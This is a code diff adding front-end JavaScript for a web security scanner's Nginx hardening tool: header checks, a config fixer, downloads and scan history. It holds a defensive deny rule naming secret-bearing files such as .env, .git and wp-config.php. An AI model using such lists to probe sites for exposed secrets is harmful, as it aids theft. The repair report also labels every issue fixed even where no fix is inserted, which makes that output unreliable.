+      btn.className = 'fixer-btn secondary lang-tab';
+    }
+  });
+  if (lastFixResult) {
+    renderFixResult(lastFixResult, lastScanResult ? lastScanResult.score : 0);
+  }
+}
+
+function switchFixPlatform(platform, prefix) {
+  prefix = prefix || 'fix-';
+  let platforms = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare"];
+  platforms.forEach(function(p) {
+    let tab = document.getElementById(prefix + 'tab-' + p);
+    let content = document.getElementById(prefix + 'content-' + p);
+    if (tab && content) {
+      if (p === platform) {
+        tab.style.background = 'var(--primary)';
+        tab.style.color = '#fff';
+        tab.style.borderColor = 'var(--primary)';
+        content.style.display = 'block';
+      } else {
+        tab.style.background = 'transparent';
+        tab.style.color = 'var(--text-secondary)';
+        tab.style.borderColor = 'var(--border)';
+        content.style.display = 'none';
+      }
+    }
+  });
+}
+
+function _fixesToText(items) {
+  if (!Array.isArray(items)) return '';
+  return items.map(function(item) {
+    if (typeof item === 'string') return item;
+    if (item && typeof item === 'object') return item.code || '';
+    return String(item);
+  }).join('\n\n');
+}
+
+function copyFixCodeByLang(lang) {
+  if (!lastFixResult) return;
+  let code = _fixesToText(lastFixResult[lang] || []);
+  copyToClipboard(code);
+  showToast('已复制 ' + lang + ' 修复代码');
+}
+
+function downloadFixCode(lang) {
+  if (!lastFixResult) return;
+  let code = _fixesToText(lastFixResult[lang] || []);
+  let ext = { nginx: 'conf', python: 'py', nodejs: 'js', apache: 'conf' };
+  let filename = 'security-fix.' + (ext[lang] || 'txt');
+  let blob = new Blob([code], { type: 'text/plain' });
+  let url = URL.createObjectURL(blob);
+  let a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast('已下载 ' + filename);
+}
+
+// 一键导出所有平台修复配置包
+function downloadAllFixes() {
+  if (!lastScanResult) { showToast('请先完成扫描'); return; }
+  // 优先使用已生成的 lastFixResult；若不存在则本地生成
+  let fixes = lastFixResult || generateLocalFixes(lastScanResult.findings);
+  if (!fixes) { showToast('暂无可导出的修复配置'); return; }
+  let platformNames = { nginx: 'Nginx', apache: 'Apache', express: 'Express', flask: 'Flask/FastAPI', spring_boot: 'Spring Boot', cloudflare: 'Cloudflare' };
+  let platformOrder = ['nginx', 'apache', 'express', 'flask', 'spring_boot', 'cloudflare'];
+  let lines = ['# 漏洞哨兵 11-S 修复配置包', '# 目标: ' + (lastScanResult.url || ''), '# 生成时间: ' + new Date().toLocaleString(), ''];
+  platformOrder.forEach(function(p) {
+    let arr = fixes[p] || [];
+    if (arr.length === 0) return;
+    lines.push('## ' + (platformNames[p] || p));
+    lines.push(_fixesToText(arr));
+    lines.push('');
+  });
+  if (lines.length <= 4) {
+    showToast('暂无可导出的修复配置');
+    return;
+  }
+  let blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  let url = URL.createObjectURL(blob);
+  let a = document.createElement('a');
+  a.href = url;
+  a.download = 'security-fixes-package-' + getHost(lastScanResult.url) + '.txt';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast('修复配置包已下载');
+}
+
+function verifyFix() {
+  if (!lastScanResult) { showToast('请先完成扫描'); return; }
+  let url = lastScanResult.url;
+  if (!url) { showToast('无法获取扫描 URL'); return; }
+  let btn = document.getElementById('verify-fix-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '验证中...'; }
+  showToast('正在重新扫描验证修复效果...');
+  authFetch('/api/verify-fix', {
+    method: 'POST',
+    body: JSON.stringify({ url: url })
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    if (btn) { btn.disabled = false; btn.textContent = '验证修复效果'; }
+    if (data.success) {
+      let oldScore = lastScanResult.score;
+      let newScore = data.new_score;
+      let msg = '重新扫描完成！评分: ' + oldScore + ' → ' + newScore;
+      if (newScore > oldScore) {
+        msg += ' (提升 ' + (newScore - oldScore) + ' 分)';
+      } else if (newScore < oldScore) {
+        msg += ' (下降 ' + (oldScore - newScore) + ' 分)';
+      } else {
+        msg += ' (无变化)';
+      }
+      showToast(msg);
+      // 计算已修复的问题
+      let oldNames = (lastScanResult.findings || []).map(function(f) { return f.name; });
+      let newNames = (data.new_findings || []).map(function(f) { return f.name; });
+      let fixedCount = oldNames.filter(function(n) { return newNames.indexOf(n) === -1; }).length;
+      if (fixedCount > 0) {
+        showToast('已修复 ' + fixedCount + ' 个安全问题');
+      }
+      // 合并新数据并更新
+      let merged = Object.assign({}, lastScanResult, {
+        score: data.new_score,
+        risk_level: data.new_risk_level,
+        findings: data.new_findings
+      });
+      lastScanResult = merged;
+      renderResult(merged);
+      navigateTo('result');
+    } else {
+      showToast('验证失败: ' + extractError(data), 'error');
+    }
+  }).catch(function(e) {
+    if (btn) { btn.disabled = false; btn.textContent = '验证修复效果'; }
+    showToast('验证扫描出错: ' + e.message, 'error');
+  });
+}
+
+// Fixer Page
+
+function loadSampleConfig() {
+  try {
+  let sample = 'server {\n    listen 80;\n    server_name example.com www.example.com;\n    root /var/www/html;\n    index index.html index.php;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n\n    location ~ \\.php$ {\n        fastcgi_pass unix:/run/php/php-fpm.sock;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n        include fastcgi_params;\n    }\n\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n}';
+  let inp = document.getElementById('fixer-input');
+  if (inp) inp.value = sample;
+  showToast('已加载示例 Nginx 配置');
+  } catch (e) {
+    console.error('loadSampleConfig error:', e);
+    showToast('加载示例配置失败: ' + (e.message || String(e)), 'error');
+  }
+}
+
+function clearFixer() {
+  try {
+  if (!confirm("确定要清空当前配置内容吗？")) return;
+  let inp = document.getElementById('fixer-input');
+  let res = document.getElementById('fixer-result');
+  if (inp) inp.value = '';
+  if (res) res.innerHTML = '';
+  showToast('已清空');
+  } catch (e) {
+    console.error('clearFixer error:', e);
+    showToast('清空失败: ' + (e.message || String(e)), 'error');
+  }
+}
+
+function analyzeFixer() {
+  setButtonLoading("fixer-analyze-btn", true);
+  setTimeout(function(){ setButtonLoading("fixer-analyze-btn", false); }, 600);
+  let inputEl = document.getElementById('fixer-input');
+  if (!inputEl) return;
+  let config = inputEl.value.trim();
+  if (!config) {
+    showToast('请先输入或粘贴 Nginx 配置');
+    return;
+  }
+  try {
+    let result = analyzeNginxConfig(config);
+    lastFixerResult = result;
+    renderFixerResult(result, config);
+  } catch (e) {
+    console.error('analyzeFixer error:', e);
+    let fr = document.getElementById('fixer-result');
+    if (fr) fr.innerHTML = '<div class="card"><p style="color:var(--danger)">分析失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
+  }
+}
+
+function analyzeNginxConfig(config) {
+  let issues = [];
+  let lines = config.split('\n');
+
+  // 1. HSTS
+  if (!/Strict-Transport-Security/i.test(config)) {
+    issues.push({
+      name: 'HSTS 未配置',
+      severity: 'high',
+      reason: '未设置 Strict-Transport-Security 头，浏览器不会强制使用 HTTPS，可能导致降级攻击。',
+      fix: 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;'
+    });
+  }
+
+  // 2. CSP
+  if (!/Content-Security-Policy/i.test(config)) {
+    issues.push({
+      name: 'CSP 未配置',
+      severity: 'high',
+      reason: '未设置 Content-Security-Policy 头，网站容易受到 XSS 攻击和数据注入。',
+      fix: 'add_header Content-Security-Policy "default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data:; font-src \'self\'; connect-src \'self\'; frame-ancestors \'none\'" always;'
+    });
+  }
+
+  // 3. X-Frame-Options
+  if (!/X-Frame-Options/i.test(config)) {
+    issues.push({
+      name: 'X-Frame-Options 未配置',
+      severity: 'medium',
+      reason: '未设置 X-Frame-Options 头，网站可能被嵌入到恶意页面的 iframe 中进行点击劫持攻击。',
+      fix: 'add_header X-Frame-Options "DENY" always;'
+    });
+  }
+
+  // 4. X-Content-Type-Options
+  if (!/X-Content-Type-Options/i.test(config)) {
+    issues.push({
+      name: 'X-Content-Type-Options 未配置',
+      severity: 'medium',
+      reason: '未设置 X-Content-Type-Options 头，浏览器可能进行 MIME 类型嗅探，导致安全问题。',
+      fix: 'add_header X-Content-Type-Options "nosniff" always;'
+    });
+  }
+
+  // 5. Referrer-Policy
+  if (!/Referrer-Policy/i.test(config)) {
+    issues.push({
+      name: 'Referrer-Policy 未配置',
+      severity: 'low',
+      reason: '未设置 Referrer-Policy 头，可能泄露敏感 URL 信息给第三方网站。',
+      fix: 'add_header Referrer-Policy "strict-origin-when-cross-origin" always;'
+    });
+  }
+
+  // 6. Permissions-Policy
+  if (!/Permissions-Policy/i.test(config)) {
+    issues.push({
+      name: 'Permissions-Policy 未配置',
+      severity: 'low',
+      reason: '未设置 Permissions-Policy 头，浏览器可能允许不必要的权限访问（摄像头、麦克风等）。',
+      fix: 'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;'
+    });
+  }
+
+  // 7. HTTP -> HTTPS redirect
+  let hasSSL = /listen\s+443/i.test(config);
+  let hasRedirect = /return\s+301\s+https/i.test(config) || /rewrite.*https/i.test(config);
+  if (!hasSSL && !hasRedirect && /listen\s+80/i.test(config)) {
+    issues.push({
+      name: 'HTTP 到 HTTPS 跳转未配置',
+      severity: 'high',
+      reason: '仅监听 HTTP 80 端口且未配置 HTTPS 跳转，所有通信为明文传输。',
+      fix: 'server {\n    listen 80;\n    server_name _;\n    return 301 https://$host$request_uri;\n}'
+    });
+  }
+
+  // 8. Sensitive files
+  if (!/\.env|deny\s+all|location.*\.(env|git|sql|zip|bak)/i.test(config)) {
+    issues.push({
+      name: '敏感文件拦截未配置',
+      severity: 'high',
+      reason: '未配置敏感文件访问拦截规则，.env、.git、.sql 等文件可能被直接访问。',
+      fix: 'location ~ /(\.env|\.git|\.gitignore|.*\.sql|.*\.zip|.*\.tar\.gz|.*\.bak|.*\.log|wp-config\.php) {\n    deny all;\n    return 403;\n}'
+    });
+  }
+
+  // Generate fixed config
+  let fixed = config;
+  let securityHeaders = [];
+  let securityRules = [];
+
+  issues.forEach(function(issue) {
+    if (issue.name === '敏感文件拦截未配置') {
+      securityRules.push(issue.fix);
+    } else if (issue.name !== 'HTTP 到 HTTPS 跳转未配置') {
+      securityHeaders.push(issue.fix);
+    }
+  });
+
+  if (securityHeaders.length > 0 || securityRules.length > 0) {
+    let lastBrace = fixed.lastIndexOf('}');
+    if (lastBrace > 0) {
+      let before = fixed.substring(0, lastBrace);
+      let after = fixed.substring(lastBrace);
+      if (securityHeaders.length > 0) {
+        securityHeaders.forEach(function(h) {
+          before += '    ' + h + '\n';
+        });
+      }
+      if (securityRules.length > 0) {
+        securityRules.forEach(function(r) {
+          let rlines = r.split('\n');
+          rlines.forEach(function(rl) {
+            if (rl.trim()) before += '    ' + rl.trim() + '\n';
+          });
+        });
+      }
+      fixed = before + after;
+    }
+  }
+
+  // Generate diff
+  let diff = generateDiff(config, fixed);
+
+  return {
+    issues: issues,
+    fixed: fixed,
+    diff: diff
+  };
+}
+
+function generateDiff(original, fixed) {
+  let origLines = original.split('\n');
+  let fixedLines = fixed.split('\n');
+  let diffLines = [];
+  let added = false;
+
+  for (let i = 0; i < fixedLines.length; i++) {
+    if (i < origLines.length) {
+      if (origLines[i] !== fixedLines[i]) {
+        if (!added) {
+          diffLines.push({ type: 'context', text: '...' });
+          added = true;
+        }
+        diffLines.push({ type: 'add', text: '+ ' + fixedLines[i] });
+      } else {
+        if (added && i > 0) {
+          diffLines.push({ type: 'context', text: '...' });
+          added = false;
+        }
+        diffLines.push({ type: 'context', text: '  ' + fixedLines[i] });
+      }
+    } else {
+      diffLines.push({ type: 'add', text: '+ ' + fixedLines[i] });
+    }
+  }
+
+  return diffLines;
+}
+
+function renderFixerResult(result, original) {
+  try {
+  result = result || { issues: [], fixed: '', diff: [] };
+  result.issues = result.issues || [];
+  result.diff = result.diff || [];
+  let html = '';
+
+  // Issues count
+  let highCount = 0, medCount = 0, lowCount = 0;
+  result.issues.forEach(function(iss) {
+    if (iss.severity === 'high') highCount++;
+    else if (iss.severity === 'medium') medCount++;
+    else lowCount++;
+  });
+
+  html += '<div class="card fade-in-up">';
+  html += '<div class="card-title">检测结果</div>';
+  html += '<div class="risk-stats" style="margin-bottom:0">';
+  html += '<div class="risk-stat high"><div class="num">' + highCount + '</div><div class="label">高严重</div></div>';
+  html += '<div class="risk-stat medium"><div class="num">' + medCount + '</div><div class="label">中严重</div></div>';
+  html += '<div class="risk-stat low"><div class="num">' + lowCount + '</div><div class="label">低严重</div></div>';
+  html += '</div></div>';
+
+  html += '<div class="card fade-in-up" style="animation-delay:0.1s">';
+  html += '<div class="card-title">修复点清单</div>';
+  result.issues.forEach(function(iss) {
+    html += '<div class="issue-item">';
+    html += '<span class="issue-severity ' + iss.severity + '">' + (iss.severity === 'high' ? '高' : iss.severity === 'medium' ? '中' : '低') + '</span>';
+    html += '<div>';
+    html += '<strong>' + escapeHtml(iss.name) + '</strong>';
+    html += '<p class="issue-reason">' + escapeHtml(iss.reason) + '</p>';
+    html += '</div></div>';
+  });
+  html += '</div>';
+
+  // Compare
+  html += '<div class="card fade-in-up" style="animation-delay:0.2s">';
+  html += '<div class="card-title">修复前后对比</div>';
+  html += '<div class="compare-grid">';
+  html += '<div class="compare-col"><h4><span class="dot red"></span>修复前</h4>';
+  html += '<textarea class="compare-textarea" readonly>' + escapeHtml(original) + '</textarea></div>';
+  html += '<div class="compare-col"><h4><span class="dot green"></span>修复后 <button class="copy-btn-sm" onclick="copyFixedConfig(this)" data-state="idle" aria-label="复制修复后配置">复制</button></h4>';
+  html += '<textarea class="compare-textarea fixed-textarea" readonly>' + escapeHtml(result.fixed) + '</textarea></div>';
+  html += '</div></div>';
+
+  // Diff
+  html += '<div class="card fade-in-up" style="animation-delay:0.3s">';
+  html += '<div class="card-title">Diff 展示</div>';
+  html += '<div class="diff-container">';
+  result.diff.forEach(function(d) {
+    html += '<div class="diff-line ' + d.type + '">' + escapeHtml(d.text) + '</div>';
+  });
+  html += '</div></div>';
+
+  html += '<div class="card fade-in-up" style="animation-delay:0.4s">';
+  html += '<div class="card-title">操作</div>';
+  html += '<div class="fixer-btns">';
+  html += '<button class="fixer-btn success" onclick="copyFixerResult()">复制修复后配置</button>';
+  html += '<button class="fixer-btn primary" onclick="downloadNginxConf()">下载 nginx.conf</button>';
+  html += '<button class="fixer-btn success" onclick="downloadRepairReport()">下载修复报告包</button>';
+  html += '</div></div>';
+
+  let fr = document.getElementById('fixer-result');
+  if (fr) fr.innerHTML = html;
+  } catch (e) {
+    console.error('renderFixerResult error:', e);
+    let fr2 = document.getElementById('fixer-result');
+    if (fr2) fr2.innerHTML = '<div class="card"><p style="color:var(--danger)">渲染失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
+  }
+}
+
+function copyFixerResult() {
+  let textarea = document.querySelector('#fixer-result .compare-col:last-child textarea');
+  if (textarea) {
+    copyToClipboard(textarea.value);
+    showToast('已复制修复后配置到剪贴板');
+  }
+}
+
+function copyFixedConfig(btn) {
+  let textarea = btn && btn.closest('.compare-col')
+    ? btn.closest('.compare-col').querySelector('textarea')
+    : document.querySelector('#fixer-result .compare-col:last-child textarea');
+  if (!textarea) return;
+  copyToClipboard(textarea.value);
+  if (btn) {
+    let orig = btn.innerHTML;
+    btn.innerHTML = '已复制';
+    btn.disabled = true;
+    setTimeout(function() { btn.innerHTML = orig; btn.disabled = false; }, 1500);
+  }
+  showToast('已复制修复后配置到剪贴板');
+}
+
+function downloadNginxConf() {
+  let textarea = document.querySelector('#fixer-result .compare-col:last-child textarea');
+  if (!textarea) return;
+  let content = textarea.value;
+  let blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+  let url = URL.createObjectURL(blob);
+  let a = document.createElement('a');
+  a.href = url;
+  a.download = 'nginx.conf';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast('nginx.conf 已下载');
+}
+
+function downloadRepairReport() {
+  if (!lastFixerResult) { showToast('请先分析配置'); return; }
+  let r = lastFixerResult;
+  let report = '=== 漏洞哨兵修复报告 ===\n';
+  report += '生成时间：' + new Date().toLocaleString('zh-CN') + '\n\n';
+  report += '--- 原始风险 ---\n';
+  r.issues.forEach(function(issue, i) {
+    report += (i + 1) + '. [' + issue.severity.toUpperCase() + '] ' + issue.name + '\n';
+    report += '   原因：' + issue.reason + '\n';
+  });
+  report += '\n--- 修复项 ---\n';
+  r.issues.forEach(function(issue, i) {
+    report += (i + 1) + '. ' + issue.name + '：已修复\n';
+  });
+  report += '\n--- 修复后配置 ---\n';
+  report += r.fixed + '\n';
+  report += '\n--- 复测建议 ---\n';
+  report += '1. 使用 curl -I 检查响应头是否包含安全头\n';
+  report += '2. 访问 /.env 等敏感路径应返回 403\n';
+  report += '3. 使用 SSL Labs 检测 HTTPS 配置\n';
+  report += '4. 检查 Content-Security-Policy 是否生效\n';
+
+  let blob = new Blob([report], { type: 'text/plain;charset=utf-8' });
+  let url = URL.createObjectURL(blob);
+  let a = document.createElement('a');
+  a.href = url;
+  a.download = 'repair-report.txt';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast('修复报告已下载');
+}
+
+function copyText(btn, b64) {
+  if (!b64) return;
+  try {
+    let text = decodeURIComponent(atob(b64));
+    copyToClipboard(text);
+    showToast('已复制到剪贴板');
+  } catch(e) {
+    showToast('复制失败');
+  }
+}
+
+function copyToClipboard(text) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text);
+  } else {
+    let ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+}
+
+// Scan History
+function saveScanHistory(data) {
+  // 扫描结果已由后端保存到数据库（按用户隔离），无需本地存储
+  updateProfileStats();
+}
+
+function clearScanHistory() {
+  if (!confirm("确定要清空所有扫描历史吗？此操作不可恢复。")) return;
+  authFetch('/api/history', { method: 'DELETE' })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      showToast('已清空 ' + (data.deleted || 0) + ' 条扫描历史');
+      updateProfileStats();
+      renderScanHistory();
+    })
+    .catch(function() {
+      showToast('清空失败，请检查网络', 'error');
+    });
+}
+
+let _historyCompareMode = false;
+let _historyCompareSelected = [];
+
+function toggleHistoryCompareMode() {
+  _historyCompareMode = !_historyCompareMode;
+  _historyCompareSelected = [];
+  let bar = document.getElementById('history-compare-bar');
+  if (bar) bar.style.display = _historyCompareMode ? 'flex' : 'none';
+  updateHistoryCompareUI();
+  renderScanHistory(historyPage);
+}
+
+function cancelHistoryCompare() {
+  _historyCompareMode = false;
+  _historyCompareSelected = [];
+  let bar = document.getElementById('history-compare-bar');
+  if (bar) bar.style.display = 'none';
+  renderScanHistory(historyPage);
+}
+
+function onHistorySelect(idx) {
+  let pos = _historyCompareSelected.indexOf(idx);
+  if (pos >= 0) {
+    _historyCompareSelected.splice(pos, 1);
+  } else {
+    if (_historyCompareSelected.length >= 2) {
+      showToast('最多选择 2 条记录进行对比');
+      return;
+    }
+    _historyCompareSelected.push(idx);
+  }
+  updateHistoryCompareUI();
+  renderScanHistory(historyPage);
+}
+
+function updateHistoryCompareUI() {
+  let count = document.getElementById('history-compare-count');
+  let btn = document.getElementById('history-compare-btn');
+  if (count) count.textContent = String(_historyCompareSelected.length);
+  if (btn) btn.disabled = _historyCompareSelected.length !== 2;
+}
+
+function doHistoryCompare() {
+  if (_historyCompareSelected.length !== 2) { showToast('请选择 2 条记录'); return; }
+  authFetch('/api/history?limit=50').then(function(r){return r.json();}).then(function(data){
+    let history = data.history || [];
+    let a = history[_historyCompareSelected[0]];
+    let b = history[_historyCompareSelected[1]];
+    if (!a || !b) { showToast('记录不存在'); return; }
+    let diff = compareHistoryItems(a, b);
+    let html = '<div class="card" style="margin-bottom:16px">';
+    html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">';
+    html += '<div class="card-title"> 历史对比</div>';
+    html += '<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>';
+    html += '</div>';
+    html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">';
+    html += '<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">';
+    html += '<div style="font-size:12px;color:var(--text-secondary)">' + escapeHtml(a.created_at || a.time || '') + '</div>';
+    html += '<div style="font-size:24px;font-weight:800;color:' + getScoreColor(a.score) + '">' + (a.score || 0) + '</div>';
+    html += '</div>';
+    html += '<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">';
+    html += '<div style="font-size:12px;color:var(--text-secondary)">' + escapeHtml(b.created_at || b.time || '') + '</div>';
+    html += '<div style="font-size:24px;font-weight:800;color:' + getScoreColor(b.score) + '">' + (b.score || 0) + '</div>';
+    html += '</div>';
+    html += '</div>';
+    html += '<div style="font-size:13px;margin-bottom:8px">分数变化：' + (diff.scoreDelta > 0 ? '+' : '') + diff.scoreDelta + ' ' + (diff.scoreDelta > 0 ? '' : diff.scoreDelta < 0 ? '' : '->') + '</div>';
+    if (diff.newIssues.length) {
+      html += '<div style="font-size:12px;color:var(--danger);margin-bottom:6px">注意： 新增问题（' + diff.newIssues.length + '）</div>';
+      diff.newIssues.forEach(function(f){ html += '<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">' + escapeHtml(f.name || f) + '</div>'; });
+    }
+    if (diff.fixedIssues.length) {
+      html += '<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（' + diff.fixedIssues.length + '）</div>';
+      diff.fixedIssues.forEach(function(f){ html += '<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">' + escapeHtml(f.name || f) + '</div>'; });
+    }
+    if (!diff.newIssues.length && !diff.fixedIssues.length) {
+      html += '<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>';
+    }
+    html += '</div>';
+    let list = safeGetElement('scan-history-list');
+    if (list) list.innerHTML = html;
+    safeSetDisplay('history-pagination', 'none');
+  }).catch(function(){ showToast('加载失败'); });
+}
+
+function compareHistoryItems(a, b) {
+  let aFindings = (a.findings || []).map(function(f){ return f.name || f; });
+  let bFindings = (b.findings || []).map(function(f){ return f.name || f; });
+  let newIssues = [];
+  let fixedIssues = [];
+  bFindings.forEach(function(name){ if (aFindings.indexOf(name) === -1) newIssues.push({name:name}); });
+  aFindings.forEach(function(name){ if (bFindings.indexOf(name) === -1) fixedIssues.push({name:name}); });
+  return { scoreDelta: (b.score || 0) - (a.score || 0), newIssues: newIssues, fixedIssues: fixedIssues };
+}
+
+function renderHistoryTrendChart(history) {
+  let wrap = document.getElementById('history-trend-wrap');
+  let container = document.getElementById('history-trend-chart');
+  if (!wrap || !container) return;
+  let recent = history.slice(0, 5).reverse();
+  if (recent.length < 2) { wrap.style.display = 'none'; return; }
+  wrap.style.display = 'block';
+  let w = container.clientWidth || 300;
+  let h = 60;
+  let pad = 4;
+  let maxScore = 100;
+  let points = recent.map(function(item, i) {
+    let x = pad + (i / (recent.length - 1)) * (w - pad * 2);
+    let y = h - pad - ((item.score || 0) / maxScore) * (h - pad * 2);
+    return { x: Math.round(x), y: Math.round(y), score: item.score || 0 };
+  });
+  let svg = '<svg width="' + w + '" height="' + h + '" style="overflow:visible">';
+  // 网格线
+  svg += '<line x1="' + pad + '" y1="' + (h/2) + '" x2="' + (w-pad) + '" y2="' + (h/2) + '" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';
+  // 折线
+  let d = points.map(function(p, i){ return (i===0?'M':'L') + p.x + ',' + p.y; }).join(' ');
+  svg += '<path d="' + d + '" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';
+  // 点
+  points.forEach(function(p) {
+    let color = p.score >= 75 ? '#73c990' : p.score >= 50 ? '#f0a732' : '#c75450';
+    svg += '<circle cx="' + p.x + '" cy="' + p.y + '" r="3" fill="' + color + '"/>';
+  });
+  svg += '</svg>';
+  container.innerHTML = svg;
+}
+
+function renderScanHistory(page) {
+  page = page || 1;
+  historyPage = page;
+  let list = safeGetElement('scan-history-list');
+  if (!list) return;
+  if (!isLoggedIn()) {
+    list.innerHTML = '<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>';
+    safeSetDisplay('history-pagination', 'none');
+    return;
+  }
+  // 从后端加载历史记录
+  list.innerHTML = '<p style="text-align:center;color:var(--text-lighter);padding:20px 0">加载中...</p>';
+  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
+    let history = data.history || [];
+    if (history.length === 0) {
+      list.innerHTML = '<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始扫描」试试</div></div>';
+      safeSetDisplay('history-pagination', 'none');
+      let tw = document.getElementById('history-trend-wrap');
+      if (tw) tw.style.display = 'none';
+      return;
+    }
+    renderHistoryTrendChart(history);
+    let totalPages = Math.ceil(history.length / historyPageSize);
+    let start = (page - 1) * historyPageSize;
+    let pageItems = history.slice(start, start + historyPageSize);
+    let html = '';
+    if (!_historyCompareMode) {
+      html += '<div style="text-align:right;margin-bottom:8px">';
+      html += '<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>';
+      html += '</div>';
+    }
+    pageItems.forEach(function(h, i) {
+      let realIndex = start + i;
+      let color = h.score >= 75 ? 'var(--success)' : h.score >= 50 ? 'var(--warning)' : 'var(--danger)';
+      let prevScore = (history[realIndex + 1] || {}).score;
+      let arrow = '';
+      if (typeof prevScore === 'number') {
+        arrow = (h.score || 0) > prevScore ? ' <span style="color:var(--success);font-size:12px"></span>' : (h.score || 0) < prevScore ? ' <span style="color:var(--danger);font-size:12px"></span>' : ' <span style="color:var(--text-lighter);font-size:12px">-></span>';
+      }
+      if (_historyCompareMode) {
+        let checked = _historyCompareSelected.indexOf(realIndex) >= 0 ? 'checked' : '';
+        html += '<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">';
+        html += '<input type="checkbox" ' + checked + ' onchange="onHistorySelect(' + realIndex + ')" style="width:16px;height:16px;accent-color:var(--primary)">';
+        html += '<div style="flex:1">';
+        html += '<div style="font-weight:600;font-size:14px">' + escapeHtml(h.url || h.host || '') + '</div>';
+        html += '<div style="font-size:12px;color:var(--text-light)">' + escapeHtml(h.created_at || h.time || '') + ' &middot; 发现 ' + (h.findings_count || 0) + ' 个问题</div>';
+        html += '</div>';
+        html += '<div style="font-size:20px;font-weight:800;color:' + color + '">' + (h.score || 0) + arrow + '</div>';
+        html += '</label>';
+      } else {
+        html += '<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory(' + realIndex + ')" role="button" tabindex="0" aria-label="恢复 ' + escapeHtml(h.url || h.host || '') + ' 的扫描结果">';
+        html += '<div style="flex:1">';
+        html += '<div style="font-weight:600;font-size:14px">' + escapeHtml(h.url || h.host || '') + '</div>';
+        html += '<div style="font-size:12px;color:var(--text-light)">' + escapeHtml(h.created_at || h.time || '') + ' &middot; 发现 ' + (h.findings_count || 0) + ' 个问题</div>';
+        html += '</div>';
+        html += '<div style="font-size:20px;font-weight:800;color:' + color + '">' + (h.score || 0) + arrow + '</div>';
+        html += '</div>';
+      }
+    });
+    list.innerHTML = html;
+    renderPagination('history-pagination', page, totalPages, 'renderScanHistory');
+  }).catch(function() {
+    list.innerHTML = '<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>';
+  });
+}
+
+function restoreScanFromHistory(index) {
+  // 从后端重新获取历史记录详情
+  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
+    let history = data.history || [];
+    if (!history[index]) return;
+    let h = history[index];
+    // 重新扫描该 URL 获取最新数据
+    navigateTo('scan');
+    let urlInput = document.getElementById('scan-url');
+    if (urlInput) urlInput.value = h.url || '';
+    showToast('已填入历史网址，点击"下一步"重新扫描');
+  }).catch(function() {
+    showToast('加载历史记录失败');
+  });
+}
+
+function updateProfileStats() {
+  if (!isLoggedIn()) {
+    safeSetText('stat-scan-count', '0');
+    safeSetText('stat-avg-score', '-');
+    safeSetText('stat-fixed-count', '0');
+    return;
+  }
+  authFetch('/api/history?limit=50').then(function(resp) { return resp.json(); }).then(function(data) {
+    let history = data.history || [];
+    let stats = data.stats || { scan_count: history.length, fixed_count: 0 };
+    let scanCount = document.getElementById('stat-scan-count');
+    let avgScore = document.getElementById('stat-avg-score');
+    let fixedCount = document.getElementById('stat-fixed-count');
+    if (scanCount) scanCount.textContent = stats.scan_count || history.length;
+    if (avgScore) {
+      if (history.length === 0) {
+        avgScore.textContent = '-';
+      } else {
+        let sum = history.reduce(function(a, b) { return a + (b.score || 0); }, 0);
+        avgScore.textContent = Math.round(sum / history.length);
+      }
+    }
+    // 已修复数：取后端真实统计（同 URL 的相邻两次扫描 diff 累计）
+    if (fixedCount) fixedCount.textContent = stats.fixed_count || 0;
+  }).catch(function() {});
+}
+
+// Profile Tab Navigation
+function showProfileTab(tab) {
+  document.querySelectorAll('.profile-tab').forEach(function(el) { el.style.display = 'none'; });
+  let target = document.getElementById('profile-tab-' + tab);
+  if (target) {
